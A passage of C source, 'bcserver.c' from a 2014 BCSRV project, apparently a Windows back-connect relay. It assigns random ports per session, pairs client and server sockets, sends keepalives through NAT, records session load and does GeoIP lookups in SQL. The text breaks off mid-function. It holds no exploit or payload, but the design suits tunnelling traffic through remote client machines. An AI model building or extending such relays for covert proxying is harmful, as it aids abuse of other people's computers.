/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BCSRV project. Version 2.7.17.1
//	
// module: bcserver.c
// $Revision: 70 $
// $Date: 2014-07-22 14:01:15 +0400 (Вт, 22 июл 2014) $
// description:
//	BC-Server main module. Server code. 

#include "main.h"
#include <mstcpip.h>
#include <mswsock.h>
#include "..\handle\handle.h"

#include "bcclient.h"
#include "db.h"
#include "bcserver.h"
#include "bitmap.h"
#include "ini.h"


__inline VOID BcReferenceServer(
	PBC_SERVER	pServer
	)
{
	InterlockedIncrement(&pServer->Header.ReferenceCount);
}

__inline VOID BcDereferenceServer(
	PBC_SERVER	pServer
	)
{
	InterlockedDecrement(&pServer->Header.ReferenceCount);
}

// Session manipulation routines

_inline PBC_SESSION	BcAddSession(
	PBC_HANDSHAKE	pBcHandshake
	)
{
	PBC_SESSION pSession;
	HANDLE		SessionKey;

	ASSERT_BC_HANDSHAKE(pBcHandshake);
	ASSERT(pBcHandshake->pServer->SessionTable);

	SessionKey = (HANDLE)(ULONG_PTR)pBcHandshake->BcRecord.UserId.Crc32;

	if (!HandleCreate(pBcHandshake->pServer->SessionTable, SessionKey, pBcHandshake, &pSession))
		pSession = NULL;
	
	return(pSession);
}

_inline PBC_SESSION BcFindSession(
	PBC_HANDSHAKE	pBcHandshake
	)
{
	PBC_SESSION pSession;
	HANDLE		SessionKey;

	ASSERT_BC_HANDSHAKE(pBcHandshake);
	ASSERT(pBcHandshake->pServer->SessionTable);

	SessionKey = (HANDLE)(ULONG_PTR)pBcHandshake->BcRecord.UserId.Crc32;

	if (!HandleOpen(pBcHandshake->pServer->SessionTable, SessionKey, &pSession))
		pSession = NULL;

	return(pSession);
}

_inline PBC_SESSION BcEnumSessions(
	PBC_SERVER	pServer,
	PBC_SESSION	pSession,
	ULONG		Index
	)
{
	PBC_SESSION pNextSession;

	if (!HandleEnum(pServer->SessionTable, Index, pSession, &pNextSession))
		pNextSession = NULL;

	return(pNextSession);
}
	

#define	BcReferenceSession(pSession)	_InterlockedIncrement(&(CONTAINING_RECORD(pSession, HANDLE_RECORD, Context)->RefCount))
#define BcDereferenceSession(pSession)	HandleClose(NULL, 0, CONTAINING_RECORD(pSession, HANDLE_RECORD, Context))



VOID InterlockedShutdownSocket(
	SOCKET*	pSocket
	)
{
	SOCKET	Socket;

	if ((Socket = (SOCKET)InterlockedExchangePointer(pSocket, (PVOID)INVALID_SOCKET)) != INVALID_SOCKET)
	{
		CancelIo((HANDLE)Socket);
		shutdown(Socket, SD_BOTH);
		closesocket(Socket);
	}
}

//
//	Updated database record for the specified DB_RECORD.
//
WINERROR BcUpdateRecord(
	PBC_SERVER	pServer,
	PBC_RECORD	pRecord
	)
{
	WINERROR Status;
	HANDLE	DbHandle;

	// Since SQL-Server has limited number of concurent connections allowed we have to make a serialization here to
	//	avoid more connections then specified in ConnectLimit parameter in INI file
	if ((Status = WaitForSingleObject(pServer->DbSemaphore, INFINITE)) == WAIT_OBJECT_0)
	{
		Status = DbConnect(&DbHandle, pServer->DbServer, pServer->DbPort, pServer->DbName, pServer->DbUser, pServer->DbPassword,
			pServer->SslCa, pServer->SslCert, pServer->SslKey);

		if (Status == NO_ERROR)
		{
			Status = DbUpdateRecord(DbHandle, pServer->DbTable, pRecord);
			DbClose(DbHandle);
		}

		ReleaseSemaphore(pServer->DbSemaphore, 1, NULL);
	}	// if (WaitForSingleObject(pServer->DbSemaphore, INFINITE) == WAIT_OBJECT_0)

	return(Status);
}


//
//	Queries GeoIp databse for the origin code for the specified IP address.
//
WINERROR BcQueryIpOriginCode(
	PBC_SERVER	pServer,
	ULONG		Address,	// IP address to resolve
	PCHAR		Buffer,		// Buffer to receive requests data
	ULONG		Size		// Size of the buffer in bytes
	)
{
	WINERROR Status;
	HANDLE	DbHandle;

	// Since SQL-Server has limited number of concurent connections allowed we have to make a serialization here to
	//	avoid more connections then specified in ConnectLimit parameter in INI file
	if ((Status = WaitForSingleObject(pServer->DbSemaphore, INFINITE)) == WAIT_OBJECT_0)
	{
		Status = DbConnect(&DbHandle, pServer->DbServer, pServer->DbPort, pServer->GeoipName, pServer->DbUser, pServer->DbPassword,
			pServer->SslCa, pServer->SslCert, pServer->SslKey);
		
		if (Status == NO_ERROR)
		{
			Status = DbQueryIpOriginCode(DbHandle, pServer->GeoipTable, Address, Buffer, Size);
			DbClose(DbHandle);
		}

		ReleaseSemaphore(pServer->DbSemaphore, 1, NULL);
	}	// if (WaitForSingleObject(pServer->DbSemaphore, INFINITE) == WAIT_OBJECT_0)


	return(Status);
}


//
//	Creates an IoCompletionPort and worker threads for the specified server.
//
WINERROR InitIoCompletionPort(
	PBC_SERVER				pServer,		// Server to initialize IoCompletionPort for
	ULONG					WorkersCount,	// Number of IO worker threads
	PVOID					WorkerContext,	// A context variable that will be passed to every worker thread
	LPTHREAD_START_ROUTINE	WorkerFunction	// Worker thread initial function
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	ULONG	ThreadId;

	do	// not a loop
	{
		if (!(pServer->hIoCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0)))
			break;
	
		if (!(pServer->pIoWorkers = (PHANDLE)hAlloc(WorkersCount * sizeof(HANDLE))))
			break;
		
		while (pServer->IoWorkersCount < WorkersCount)
		{
			if (!(pServer->pIoWorkers[pServer->IoWorkersCount] = CreateThread(NULL, 0, WorkerFunction, WorkerContext, 0, &ThreadId)))
				break;
			pServer->IoWorkersCount += 1;
		}	// while (pServer->IoWorkersCount < WorkersCount)
		
		if (pServer->IoWorkersCount != WorkersCount)
			break;

		Status = NO_ERROR;

	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();
				
	return(Status);
}

//
//	Releases server IoCompletionPort and it's worker threads.
//
VOID ReleaseIoCompletionPort(
	PBC_SERVER pServer
	)
{
	ULONG i;

	if (pServer->hIoCompletionPort)
	{
		if (pServer->IoWorkersCount)
		{
			ASSERT(pServer->pIoWorkers);

			for (i=0; i<pServer->IoWorkersCount; i++)
			{
				//Send queued completion status with CompletionKey==0 to get all the Worker threads out of waiting.
				PostQueuedCompletionStatus(pServer->hIoCompletionPort, 0, 0, NULL);
			}

			WaitForMultipleObjects(pServer->IoWorkersCount, pServer->pIoWorkers, TRUE, INFINITE);

			for (i=0; i<pServer->IoWorkersCount; i++)
				CloseHandle(pServer->pIoWorkers[i]);

			hFree(pServer->pIoWorkers);
		}	// if (pServer->IoWorkersCount)
		CloseHandle(pServer->hIoCompletionPort);
	}	// if (pServer->hIoCompletionPort)
}


//
//	Stops all IO operations for the specified BC-Link.
//	Closes sockets.
//
VOID BcStopLink(
	PBC_LINK pLink
	)
{
	ASSERT_BC_LINK(pLink);

	InterlockedShutdownSocket(&pLink->Context[BC_SERVER_SIDE].Socket);
	InterlockedShutdownSocket(&pLink->Context[BC_CLIENT_SIDE].Socket);
}


VOID DeleteLink(
	PBC_LINK	pLink,
	PBC_SESSION	pSession,
	BOOL		bRelease
	)
{
	ASSERT_BC_LINK(pLink);
	ASSERT_BC_SESSION(pSession);

	// Releasing link sockets
	BcStopLink(pLink);

	DbgPrint("BCSRV: Link 0x%p deleted, %u bytes sent, %u bytes received.\n", pLink, pLink->SentToClient, pLink->RecvdFromClient);

	if (bRelease || (pSession->FreeLinks > (max(pSession->ActiveLinksMax, pSession->ActiveLinksCount) - pSession->ActiveLinksCount)))
	{
		// Releasing link, freeing memory
#if _DEBUG
		// Decrementing number of links before dereferencing the session
		InterlockedDecrement(&pSession->pServer->NumberOfLinks);
		pLink->Header.Magic = ~BC_LINK_MAGIC;
#endif
		// Freeing memory
		vFree(pLink);
	}	// if (bRelease || (pSession->FreeLinks > pSession->ActiveLinksMax))
	else
	{
		// Adding link to the session free list
		InsertTailList(&pSession->FreeLinksList, &pLink->Entry);
		pSession->FreeLinks += 1;		
	}

	// Dereferencing the session
	BcDereferenceSession(pSession);
}

// 
//	Decrements the specified link reference count. When the reference count reaches 0 link is being deleted.
//
VOID DereferenceLink(
	PBC_LINK	pLink,
	BOOL		bRelease
	)
{
	PBC_SESSION	pSession;
	LONG		RefCount;

	ASSERT_BC_LINK(pLink);
	ASSERT(pLink->Header.ReferenceCount > 0);

	pSession = pLink->pSession;

	ASSERT_BC_SESSION(pSession);

	if ((RefCount = InterlockedDecrement(&pLink->Header.ReferenceCount)) == 0)
	{
		ASSERT(pLink->Header.ReferenceCount == 0);

		// Reference session before deleting a link
		BcReferenceSession(pSession);

		// Unlinking from the BC_SESSION.XXXLinksList
		EnterCriticalSection(&pSession->SessionLock);
		RemoveEntryList(&pLink->Entry);
		if (!bRelease)
			DeleteLink(pLink, pSession, FALSE);
		LeaveCriticalSection(&pSession->SessionLock);
	
		// Deleting the link
		if (bRelease)
			DeleteLink(pLink, pSession, TRUE);

		BcDereferenceSession(pSession);
	}	// if (InterlockedDecrement(&pLink->ReferenceCount) == 0)
	else
	{
		if (RefCount == 1)
		{
			// Decrementing number of active links
			InterlockedDecrement(&pSession->ActiveLinks);
			ASSERT(pSession->ActiveLinks >= 0);
		}
	}
}

VOID ReferenceLink(
	PBC_LINK pLink
	)
{
	ASSERT_BC_LINK(pLink);
	ASSERT(pLink->Header.ReferenceCount > 0);

	if (InterlockedIncrement(&pLink->Header.ReferenceCount) == 2)
		InterlockedIncrement(&pLink->pSession->ActiveLinks);
}


//
//	Terminates BC-Session and releases all corresponding structures.
//	Returns TRUE if the specified session was completely deleted.
//
BOOL BcTerminateSession(
	PBC_SESSION	pSession,
	BOOL		bDereference
	)
{
	PLIST_ENTRY	pEntry;
	PBC_LINK	pLink;
	BOOL		Ret = FALSE;

	ASSERT_BC_SESSION(pSession);

	// Releasing session ports
	InterlockedShutdownSocket(&pSession->Port.Socket);

	EnterCriticalSection(&pSession->SessionLock);

	// Terminating pending links
	pEntry = pSession->PendingLinksList.Flink;
	while (pEntry != &pSession->PendingLinksList)
	{
		pLink = CONTAINING_RECORD(pEntry, BC_LINK, Entry);
		ASSERT_BC_LINK(pLink);
		pEntry = pEntry->Flink;

		ASSERT(pLink->Header.ReferenceCount == 1);
		DereferenceLink(pLink, TRUE);
	}	// while (pEntry != &pSession->PendingLinksList)

	// Terminating active links
	pEntry = pSession->ActiveLinksList.Flink;
	while(pEntry != &pSession->ActiveLinksList)
	{
		pLink = CONTAINING_RECORD(pEntry, BC_LINK, Entry);
		ASSERT_BC_LINK(pLink);
		pEntry = pEntry->Flink;

		BcStopLink(pLink);
	}	// while(pEntry != &pSession->ActiveLinksList)
	LeaveCriticalSection(&pSession->SessionLock);

	if (bDereference)
		Ret = BcDereferenceSession(pSession);

	return(Ret);
}


//
//	Initiates asynchronous read operation over the specified BC-Link.
//
WINERROR BcLinkReceive(
	PBC_LINK	pLink,
	ULONG		Side
	)
{
	BOOL			Ret;
	WINERROR		Status = NO_ERROR;
	PBC_CONTEXT		pContext;
	LPOVERLAPPED	pOverlapped;

	ASSERT_BC_LINK(pLink);

	pContext = &pLink->Context[Side];

	ASSERT(pContext->BcOverlapped.pControlObject == &pLink->Header);

	pOverlapped = &pContext->BcOverlapped.Overlapped;
	pContext->OpCode = BC_CONTEXT_RECV;

	// We have to reference our link here because the operation may be completed before we leave this function 
	//  and in case of an error the link can be deleted there.
	ReferenceLink(pLink);

	Ret = ReadFile((HANDLE)pContext->Socket, &pContext->Buffer, BC_SESSION_BUFFER_SIZE, NULL, pOverlapped);

	if (!Ret && ((Status = GetLastError()) == ERROR_IO_PENDING))
		Status = NO_ERROR;

	if (Status != NO_ERROR)
	{
		DbgPrint("BCSRV: Link 0x%p receive error %u\n", pLink, Status);
	}

	DereferenceLink(pLink, FALSE);

	return(Status);
}


//
//	Initiates asynchronous send operation over the specified BC-Link.
//
WINERROR BcLinkSend(
	PBC_LINK	pLink,
	ULONG		Side
	)
{
	BOOL Ret;
	WINERROR	Status = NO_ERROR;
	PBC_CONTEXT	pSource, pTarget;
	LPOVERLAPPED	pOverlapped;

	ASSERT_BC_LINK(pLink);

	pSource = &pLink->Context[Side];
	pTarget = &pLink->Context[(Side == BC_SERVER_SIDE ? BC_CLIENT_SIDE : BC_SERVER_SIDE)];

	ASSERT(pSource->BcOverlapped.pControlObject == &pLink->Header);
	ASSERT(pTarget->BcOverlapped.pControlObject == &pLink->Header);
	ASSERT(pSource->OpCode == BC_CONTEXT_RECV);

	pOverlapped = &pSource->BcOverlapped.Overlapped;
	pSource->OpCode = BC_CONTEXT_SEND;
	pSource->Size = (ULONG)pOverlapped->InternalHigh;

	// We have to reference our link here because the operation may be completed before we leave this function 
	//  and in case of an error the link can be deleted there.
	ReferenceLink(pLink);

	Ret = WriteFile((HANDLE)pTarget->Socket, pSource->Buffer, (ULONG)pOverlapped->InternalHigh, NULL, pOverlapped);

	if (!Ret && ((Status = GetLastError()) == ERROR_IO_PENDING))
		Status = NO_ERROR;

	if (Status != NO_ERROR)
	{
		DbgPrint("BCSRV: Link 0x%p send error %u\n", pLink, Status);
	}

	DereferenceLink(pLink, FALSE);

	return(Status);
}

//
//	Initiates asynchronous send operation of the BC KeepAlive packet over the specified BC-Link.
//	This function is used to determine if the specified link connection is not gone yet.
//	When a client works behind the NAT the standard TCP/IP KeepAlive function doesn't work because the NAT 
//		keeps a connection and sends back the KeepAlive reply independing on a fact that the client already gone.
//
WINERROR BcLinkKeepalive(
	PBC_LINK	pLink
	)
{
	BOOL Ret;
	WINERROR	Status = NO_ERROR;
	PBC_CONTEXT	pTarget;
	LPOVERLAPPED	pOverlapped;

	ASSERT_BC_LINK(pLink);

	pTarget = &pLink->Context[BC_SERVER_SIDE];

	ASSERT(pTarget->BcOverlapped.pControlObject == &pLink->Header);

	pOverlapped = &pTarget->BcOverlapped.Overlapped;
	pTarget->OpCode = BC_CONTEXT_KEEPALIVE;
	pTarget->Buffer[0] = 0;

	// We have to reference our link here because the operation may be completed before we leave this function 
	//  and in case of an error the link can be deleted there.
	ReferenceLink(pLink);

	// Referencing link once again for KeepAlive send operation
	ReferenceLink(pLink);

	Ret = WriteFile((HANDLE)pTarget->Socket, pTarget->Buffer, 1, NULL, pOverlapped);

	if (!Ret && ((Status = GetLastError()) == ERROR_IO_PENDING))
		Status = NO_ERROR;

	if (Status != NO_ERROR)
	{
		DbgPrint("BCSRV: Link 0x%p keepalive send error %u\n", pLink, Status);
		DereferenceLink(pLink, FALSE);
	}
	else
	{
		DbgPrint("BCSRV: Link 0x%p keepalive sent\n", pLink);
	}

	DereferenceLink(pLink, FALSE);

	return(Status);
}


//
//	Activates the specified link by starting server and client-side read operations.
//
VOID BcActivateLink(
	PBC_LINK pLink
	)
{
	ULONG	Status = NO_ERROR;
	HANDLE	hIoCompletionPort;

	ASSERT_BC_LINK(pLink);
	ASSERT(pLink->Header.ReferenceCount >= 2);

	hIoCompletionPort = pLink->pSession->pServer->hIoCompletionPort;

	if ((Status = BcLinkReceive(pLink, BC_SERVER_SIDE)) == NO_ERROR)
	{
		if (!CreateIoCompletionPort((HANDLE)pLink->Context[BC_CLIENT_SIDE].Socket, hIoCompletionPort, (ULONG_PTR)&pLink->Header, 0) ||
			(Status = BcLinkReceive(pLink, BC_CLIENT_SIDE)) != NO_ERROR)
		{
			DbgPrint("BCSRV: Link 0x%p client side failed, status %u\n", pLink, (Status == NO_ERROR ? GetLastError() : Status));

			// Terminating server side operation
			BcStopLink(pLink);
			// Dereferencing from the client side
			DereferenceLink(pLink, FALSE);
		}
	}
	else
	{
		DbgPrint("BCSRV: Link 0x%p server side failed, status %u\n", pLink, (Status == NO_ERROR ? GetLastError() : Status));
		// Dereferencing from the client side
		DereferenceLink(pLink, FALSE);
		// Dereferencing from the server side
		DereferenceLink(pLink, FALSE);
	}
}


//
//	Returns TRUE if the specified context socket is connected.
//
BOOL BcIsConnected(
	PBC_CONTEXT	pContext
	)
{
	BOOL	Ret = FALSE;
	HANDLE	hEvent;

	if (hEvent = CreateEvent(NULL, TRUE, FALSE, NULL))
	{
		WSAEventSelect(pContext->Socket, hEvent, FD_CLOSE);
		if (WaitForSingleObject(hEvent, 0) == WAIT_TIMEOUT)
			Ret = TRUE;
		CloseHandle(hEvent);
	}	// if (hEvent = CreateEvent(NULL, TRUE, FALSE, NULL))

	return(Ret);
}


//
//	Adds new BC-Link to the specified session.
//
static BOOL BcAddLink(
	PBC_SESSION	pSession,	// Session to add a link
	SOCKET		Socket,		// Connected socket for the link
	ULONG		Side		// BC-side of the link
	)
{
	PBC_LINK pLink = NULL;
	BOOL	bPending = FALSE;
	ULONG	Size;
	BOOL	bRet = TRUE, bActivate = FALSE;
	TCP_KEEPALIVE	Keepalive = {TRUE, BC_KEEPALIVE_TIME, BC_KEEPALIVE_INTERVAL};
	PLIST_ENTRY		pEntry;

	ASSERT_BC_SESSION(pSession);

#ifdef	_BC_ENABLE_KEEPALIVE
	// Enabling TCP/IP keepalive option, setting timeout and interval
	if (WSAIoctl(Socket, SIO_KEEPALIVE_VALS, &Keepalive, sizeof(TCP_KEEPALIVE), NULL, 0, &Size, NULL, NULL) == 0)
#endif
	{
		EnterCriticalSection(&pSession->SessionLock);

		// First, checking if there's an existing pending link with the specified side curently empty
		pEntry = pSession->PendingLinksList.Flink;
		while (pEntry != &pSession->PendingLinksList)
		{
			pLink = CONTAINING_RECORD(pEntry, BC_LINK, Entry);
			ASSERT_BC_LINK(pLink);

			if (pLink->Context[Side].Socket == INVALID_SOCKET)
			{
				pEntry = pEntry->Flink;
				RemoveEntryList(&pLink->Entry);

				if (Side == BC_CLIENT_SIDE)
				{
					// This means we have just taken a server side link from the list
					pSession->ServerLinks -= 1;
					ASSERT(pSession->ServerLinks >= 0);
				}

				if (!BcIsConnected(&pLink->Context[Side ^ 1]))
				{
					// Link is disconnected, deleting it
					while (pLink->Header.ReferenceCount != 1)
						// There can be a keepalive sent for the link, we have to wait until it completes
						Sleep(100);
					DeleteLink(pLink, pSession, FALSE);
					pLink = NULL;
				}
				else
				{
					bPending = TRUE;
					break;
				}
			}
			else
			{
				ASSERT(pSession->ServerLinks == 0 || Side == BC_SERVER_SIDE);
				pLink = NULL;
				break;
			}
		}	// while (pEntry != &pSession->PendingLinksList)

		if (!pLink)
		{
			// Looking for a free link
			if (pSession->FreeLinks)
			{
				pLink = CONTAINING_RECORD(pSession->FreeLinksList.Flink, BC_LINK, Entry);
				ASSERT_BC_LINK(pLink);
				RemoveEntryList(&pLink->Entry);
				pSession->FreeLinks -= 1;
#if _DBG
				pLink->RecvdFromClient = 0;
				pLink->SentToClient = 0;
#endif
			}	// if (pSession->FreeLinks)
			else
			{
				// If no free link was found creating a new one
				if (pLink = vAlloc(sizeof(BC_LINK)))
				{
					InitializeListHead(&pLink->Entry);
					pLink->Header.Magic = BC_LINK_MAGIC;

					pLink->Context[BC_SERVER_SIDE].Socket = INVALID_SOCKET;
					pLink->Context[BC_SERVER_SIDE].BcOverlapped.pControlObject = &pLink->Header;
					pLink->Context[BC_CLIENT_SIDE].Socket = INVALID_SOCKET;
					pLink->Context[BC_CLIENT_SIDE].BcOverlapped.pControlObject = &pLink->Header;
	#if _DEBUG
					InterlockedIncrement(&pSession->pServer->NumberOfLinks);
	#endif
				}	// if (pLink = vAlloc(sizeof(BC_LINK)))
			}	// else // if (pSession->FreeLinks)
		}	// if (!pLink)

		if (pLink)
		{
			pLink->Context[Side].Socket = Socket;

			if (bPending)
			{
				// The link was taken from the pending list and it's ready now, activating it
				pLink->Header.ReferenceCount += 1;
				GetSystemTimeAsFileTime((PFILETIME)&pLink->TransferTime);
				InterlockedIncrement(&pSession->ActiveLinks);
				InsertTailList(&pSession->ActiveLinksList, &pLink->Entry);
				pSession->ActiveLinksCount += 1;
				bActivate = TRUE;
			}
			else
			{
				// The link has just being created, adding it to the pending list
				pLink->Header.ReferenceCount = 1;
				pLink->pSession = pSession;
				BcReferenceSession(pSession);

				if (Side == BC_SERVER_SIDE)
					pSession->ServerLinks += 1;
				InsertTailList(&pSession->PendingLinksList, &pLink->Entry);
				pSession->PendingLinksCount += 1;
			}
		}	// if (pLink)
		else
		{
			DbgPrint("BCSRV: Not enough memory to create a new link.\n");
			closesocket(Socket);
			bRet = FALSE;
		}

		LeaveCriticalSection(&pSession->SessionLock);

		if (bActivate)
		{
			DbgPrint("BCSRV: Link 0x%p for session 0x%p activated\n", pLink, pSession);
			BcActivateLink(pLink);
		}
	}	// if (WSAIoctl(Socket,...
#ifdef _BC_ENABLE_KEEPALIVE
	else
	{
		DbgPrint("BCSRV: Enabling keepalive for socket 0x%x side %u failed, error %u\n", Socket, Side, GetLastError());
		closesocket(Socket);
		bRet = FALSE;
	}
#endif
	return(bRet);
}


VOID BcUpdateSessionLoad(
	PBC_SESSION	pSession
	)
{
	ULONG LoadPct = 0;
	LIST_ENTRY	FreeLinksList;
	PBC_LINK	pLink;

	InitializeListHead(&FreeLinksList);

	EnterCriticalSection(&pSession->SessionLock);

	if (pSession->ActiveLinksMax < pSession->ActiveLinksCount)
		pSession->ActiveLinksMax = pSession->ActiveLinksCount;
	else
		pSession->ActiveLinksMax = (pSession->ActiveLinksMax + pSession->ActiveLinksCount) >> 1;

	if (pSession->ActiveLinksMax)
	{
		LoadPct = pSession->PendingLinksCount * 100 / pSession->ActiveLinksMax;

		DbgPrint("BCSRV: Session 0x%p statistics: free %u, pending %u, active %u, max %u, load %u%%\n", pSession, pSession->FreeLinks, pSession->PendingLinksCount, pSession->ActiveLinksCount, pSession->ActiveLinksMax, LoadPct);
		pSession->PendingLinksCount = 0;
		pSession->ActiveLinksCount = 0;

		// Checking if there are unused free links attached to the session
		while((pSession->FreeLinks) && ((pSession->FreeLinks + pSession->PendingLinksCount) > pSession->ActiveLinksMax))
		{
			pLink = CONTAINING_RECORD(pSession->FreeLinksList.Flink, BC_LINK, Entry);
			ASSERT_BC_LINK(pLink);

			RemoveEntryList(&pLink->Entry);
			pSession->FreeLinks -= 1;
			InsertTailList(&FreeLinksList, &pLink->Entry);
		}
	}	// if (pSession->ActiveLinksMax)

	LeaveCriticalSection(&pSession->SessionLock);

	if (LoadPct != pSession->BcRecord.LoadPct)
	{
		pSession->BcRecord.LoadPct = LoadPct;
		BcUpdateRecord(pSession->pServer, &pSession->BcRecord);
	}

	// Deleting unused free links
	while(!IsListEmpty(&FreeLinksList))
	{
		pLink = CONTAINING_RECORD(FreeLinksList.Flink, BC_LINK, Entry);
		ASSERT_BC_LINK(pLink);

		RemoveEntryList(&pLink->Entry);
#if _DEBUG
		// Decrementing number of links before dereferencing the session
		InterlockedDecrement(&pSession->pServer->NumberOfLinks);
		pLink->Header.Magic = ~BC_LINK_MAGIC;
#endif
		vFree(pLink);
	}
}

//
//	Walks through the specified session pending links list and checks if every link is still connected.
//	Deletes links that are not connected.
//
VOID BcCheckPendingLinks(
	PBC_SESSION	pSession
	)
{
	PBC_LINK	pLink;
	PBC_CONTEXT	pContext;
	PLIST_ENTRY	pEntry;
	ULONG		Side;

	ASSERT_BC_SESSION(pSession);

	EnterCriticalSection(&pSession->SessionLock);

	pEntry = pSession->PendingLinksList.Flink;

	while(pEntry != &pSession->PendingLinksList)
	{
		pLink = CONTAINING_RECORD(pEntry, BC_LINK, Entry);

		ASSERT_BC_LINK(pLink);
		ASSERT(pLink->Header.ReferenceCount == 1);

		pEntry = pEntry->Flink;

		pContext = &pLink->Context[(Side = BC_SERVER_SIDE)];
		if (pContext->Socket == INVALID_SOCKET)
		{
			pContext = &pLink->Context[(Side = BC_CLIENT_SIDE)];
			ASSERT(pContext->Socket != INVALID_SOCKET);
		}

		if (!BcIsConnected(pContext) || 
			(Side == BC_SERVER_SIDE && BcLinkKeepalive(pLink) != NO_ERROR))
		{
			if (Side == BC_SERVER_SIDE)
				pSession->ServerLinks -= 1;

			DbgPrint("BCSRV: Dereferencing pending link 0x%p\n", pLink);
			DereferenceLink(pLink, FALSE);
		}

	}	// while(pEntry != &pSession->PendingLinksList)
	LeaveCriticalSection(&pSession->SessionLock);
}


#ifdef _BC_CHECK_ACTIVE_LINKS
//
//	Checks all active links within the session.
//	Stops a link if there was no data transfered through it during BC_PENDING_LINK_TIMEOUT.
//
VOID BcCheckActiveLinks(
	PBC_SESSION		pSession,
	PLARGE_INTEGER	pTime
	)
{
	PBC_LINK	pLink;
	PLIST_ENTRY	pEntry;

	ASSERT_BC_SESSION(pSession);

	EnterCriticalSection(&pSession->SessionLock);

	pEntry = pSession->ActiveLinksList.Flink;
	while(pEntry != &pSession->ActiveLinksList)
	{
		pLink = CONTAINING_RECORD(pEntry, BC_LINK, Entry);

		ASSERT_BC_LINK(pLink);
		// Checking if the link is active and is not being terminated yet
		if (pLink->Header.ReferenceCount)
		{
			if ((pTime->QuadPart - pLink->TransferTime.QuadPart) > _SECONDS(BC_PENDING_LINK_TIMEOUT))
			{
				DbgPrint("BCSRV: Link 0x%p stopped because of a pending timeout\n", pLink);
				BcStopLink(pLink);
			}
		}	// if (pLink->ReferenceCount)

		pEntry = pEntry->Flink;
	}	// while(pEntry != &pSession->ActiveLinksList)
	LeaveCriticalSection(&pSession->SessionLock);
}


#endif	// _BC_CHECK_ACTIVE_LINKS

//
//	Reads the specified exact amount of data from the specified socket.
//
static WINERROR SocketRead(
	SOCKET	Socket,		// socket to read from
	PCHAR	Buffer,		// buffer to write data to
	LONG	bSize		// size of the buffer in bytes (number of bytes to read)
	)
{
	WINERROR Status = NO_ERROR;
	LONG	 bRead;

	ASSERT(bSize);

	do 
	{
		bRead = recv(Socket, Buffer, bSize, 0);
		if (bRead == 0)
		{
			Status = ERROR_CONNECTION_ABORTED;
			break;
		}

		if (bRead == SOCKET_ERROR)
		{
			Status = GetLastError();
			break;
		}

		bSize -= bRead;
		Buffer += bRead;
	} while(bSize);

	return(Status);
}


//
//	Initializes BC_PORT structure: creates a socket and binds it to a random TCP port.
//
WINERROR BcInitPort(
	PBC_SERVER	pServer,
	PBC_PORT	Port
	)
{
	WINERROR Status = NO_ERROR;
	BOOL	NbIo = TRUE;

	// Creating a socket
	if ((Port->Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET)
	{
		SOCKADDR_IN	Addr = {0};
		BOOL Optval = TRUE;
		Addr.sin_family = AF_INET;

		// Setting SO_EXCLUSIVEADDRUSE option to use exclusive port number for the socket
		setsockopt(Port->Socket, SOL_SOCKET, SO_EXCLUSIVEADDRUSE, (PCHAR)&Optval, sizeof(BOOL));

		do
		{
			// Binding the socket to a random TCP port
			ULONG Index, Offset = (rand()%((BC_PORT_RANGE_TOP - BC_PORT_RANGE_BOTTOM) >> 3));

			if ((Index = BmGetIndex(pServer->PortBitmap + Offset, BC_PORT_RANGE_TOP - BC_PORT_RANGE_BOTTOM - Offset)) != INVALID_INDEX ||
				(Index = BmGetIndex(pServer->PortBitmap + (Offset = 0), BC_PORT_RANGE_TOP - BC_PORT_RANGE_BOTTOM)) != INVALID_INDEX)
			{

				Port->Number = (USHORT)(Index + (Offset << 3) + BC_PORT_RANGE_BOTTOM);
				Addr.sin_port = htons(Port->Number);
			}
			else
			{
				DbgPrint("BCSRV: No more TCP ports\n");
				Status = ERROR_INDEX_ABSENT;
				break;
			}
		} while(bind(Port->Socket, (struct sockaddr*)&Addr, sizeof(SOCKADDR_IN)) && Port->Socket != INVALID_SOCKET);

		if (Port->Socket != INVALID_SOCKET)
			// Switching the socket to non-blocking mode
			ioctlsocket(Port->Socket, FIONBIO, &NbIo);
		else
			Status = ERROR_INVALID_PARAMETER;
	}	// if (pContext->Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))
	else
		Status = GetLastError();

	return(Status);
}


// Session table init and cleanup callbacks 

static BOOL __stdcall BcOnSessionCreate(
	HANDLE			Key, 
	PBC_SESSION		pSession,
	PBC_HANDSHAKE	pBcHandshake
	)
{
	BOOL Ret = FALSE;
	PBC_SERVER	pServer;

	ASSERT_BC_HANDSHAKE(pBcHandshake);

	pServer = pBcHandshake->pServer;

	do
	{
		if (InterlockedIncrement(&pServer->NumberOfSessions) > pServer->ClientsLimit)
		{
			DbgPrint("BCSRV: Unable to create BC-session due to a connection limit.\n");
			break;
		}

		InitializeCriticalSection(&pSession->SessionLock);
		if (!pSession->SessionLock.DebugInfo)
		{
			// Sometimes it may happen that critical section failed to initialize, but InitializeCriticalSection doesn't
			//	return an error.
			DbgPrint("BCSRV: Unable to initialize critical section for a session.\n");
			break;
		}

		pSession->Header.Magic = BC_SESSION_MAGIC;
		pSession->pServer = pServer;
		pSession->Port.Socket = INVALID_SOCKET;

		// Initialzing session links lists
		InitializeListHead(&pSession->PendingLinksList);
		InitializeListHead(&pSession->ActiveLinksList);
		InitializeListHead(&pSession->FreeLinksList);

		// Setting session pending time
		GetSystemTimeAsFileTime((LPFILETIME)&pSession->PendingTime);

		Ret = TRUE;
	} while(FALSE);

	if (!Ret)
		InterlockedDecrement(&pServer->NumberOfSessions);

	return(Ret);
}

static BOOL __stdcall BcOnSessionDelete(
	HANDLE		Key,
	PBC_SESSION	pSession,
	PVOID		UserContext
	)
{
	PLIST_ENTRY	pEntry;
	PBC_LINK	pLink;

	ASSERT_BC_SESSION(pSession);

	ASSERT(IsListEmpty(&pSession->ActiveLinksList));
	ASSERT(IsListEmpty(&pSession->PendingLinksList));

	if (pSession->Port.Number)
	{
		ASSERT(pSession->Port.Number >= BC_PORT_RANGE_BOTTOM && pSession->Port.Number < BC_PORT_RANGE_TOP);
		BmFreeIndex(pSession->pServer->PortBitmap, pSession->Port.Number - BC_PORT_RANGE_BOTTOM);
	}

	pEntry = pSession->FreeLinksList.Flink;
	while(pEntry != &pSession->FreeLinksList)
	{
		pLink = CONTAINING_RECORD(pEntry, BC_LINK, Entry);
		ASSERT_BC_LINK(pLink);

